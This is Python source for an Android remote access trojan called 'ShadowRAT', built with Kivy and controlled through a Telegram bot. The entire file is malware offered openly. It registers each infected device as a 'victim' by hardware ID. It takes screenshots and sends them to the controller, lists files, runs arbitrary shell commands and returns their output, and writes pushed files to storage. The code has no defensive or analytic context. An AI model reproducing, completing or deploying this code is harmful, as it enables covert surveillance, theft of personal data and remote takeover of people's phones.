# ShadowRAT Android Edition - Telegram C2
# Build with: buildozer android debug (Kivy + Buildozer required)
# Python-for-Android compatible

from kivy.app import App
from kivy.uix.label import Label
from kivy.clock import Clock
from kivy.utils import platform
import telebot
import threading
import os
import uuid
import hashlib
import time
import socket
import subprocess
import kivy
kivy.require('2.3.0')

# ===================== CONFIG =====================
BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
ALLOWED_CHAT_ID = 123456789

# ===================== HWID =====================
def generate_hwid():
    try:
        # Android ID fallback
        from jnius import autoclass
        Build = autoclass('android.os.Build')
        android_id = Build.SERIAL if hasattr(Build, 'SERIAL') else str(uuid.uuid4())
        combined = f"{android_id}{platform}"
        return hashlib.sha256(combined.encode()).hexdigest()[:16].upper()
    except:
        return str(uuid.uuid4())[:16].upper()

VICTIM_HWID = generate_hwid()

# ===================== BOT =====================
bot = telebot.TeleBot(BOT_TOKEN)

def send_to_c2(text):
    tag = f"Android Victim: {VICTIM_HWID}"
    try:
        bot.send_message(ALLOWED_CHAT_ID, f"{tag}\n{text}")
    except:
        pass

# ===================== COMMANDS =====================
@bot.message_handler(func=lambda m: m.chat.id == ALLOWED_CHAT_ID)
def handle_commands(message):
    cmd = message.text.strip().lower()

    if cmd == "/start":
        send_to_c2("Android RAT Online 🖤\nUse /help")

    elif cmd == "/help":
        send_to_c2("""
 /sysinfo
 /screenshot     (needs WRITE_EXTERNAL_STORAGE)
 /list <path>    (default /sdcard/)
 /exec <cmd>     (limited - no su)
 /mic <seconds>  (needs RECORD_AUDIO)
 /upload         (attach file)
        """)

    elif cmd == "/sysinfo":
        info = f"""
HWID: {VICTIM_HWID}
OS: Android {platform.release() if hasattr(platform, 'release') else 'Unknown'}
Model: {platform.machine() if hasattr(platform, 'machine') else 'Unknown'}
IP: {socket.gethostbyname(socket.gethostname())}
        """
        send_to_c2(info)

    elif cmd == "/screenshot":
        try:
            subprocess.run(["screencap", "-p", "/sdcard/screen.png"], check=True)
            with open("/sdcard/screen.png", "rb") as f:
                bot.send_document(ALLOWED_CHAT_ID, f, caption=f"Screenshot - {VICTIM_HWID}")
            os.remove("/sdcard/screen.png")
            send_to_c2("Screenshot sent")
        except Exception as e:
            send_to_c2(f"Screenshot failed: {str(e)} (permission or root?)")

    elif cmd.startswith("/list"):
        path = cmd[6:].strip() or "/sdcard/"
        try:
            files = "\n".join(os.listdir(path))
            send_to_c2(f"Files in {path}:\n{files}")
        except Exception as e:
            send_to_c2(f"List error: {str(e)}")

    elif cmd.startswith("/exec "):
        command = cmd[6:]
        try:
            output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT, text=True, timeout=15)
            send_to_c2(f"Output:\n{output}")
        except Exception as e:
            send_to_c2(f"Exec error: {str(e)}")

    elif cmd.startswith("/mic "):
        send_to_c2("Microphone recording not implemented yet. Requires plyer or jnius audio API.")

    elif cmd.startswith("/upload"):
        if message.document:
            try:
                file_info = bot.get_file(message.document.file_id)
                data = bot.download_file(file_info.file_path)
                save_path = os.path.join("/sdcard/Download", message.document.file_name)
                with open(save_path, "wb") as f:
                    f.write(data)
                send_to_c2(f"File uploaded to {save_path}")
            except Exception as e:
                send_to_c2(f"Upload failed: {str(e)}")
        else:
            send_to_c2("Send file with /upload")

# ===================== AUTO CONNECT =====================
def start_bot_polling():
    while True:
        try:
            bot.polling(none_stop=True, interval=0, timeout=20)
        except Exception as e:
            time.sleep(10)

class ShadowRAT(App):
    def build(self):
        Clock.schedule_once(lambda dt: threading.Thread(target=start_bot_polling, daemon=True).start(), 2)
        send_to_c2(f"NEW ANDROID VICTIM CONNECTED!\nHWID: {VICTIM_HWID}")
        return Label(text=f"ShadowRAT Android\nHWID: {VICTIM_HWID}\nStatus: Online 🖤", font_size=20)

if __name__ == '__main__':
    ShadowRAT().run()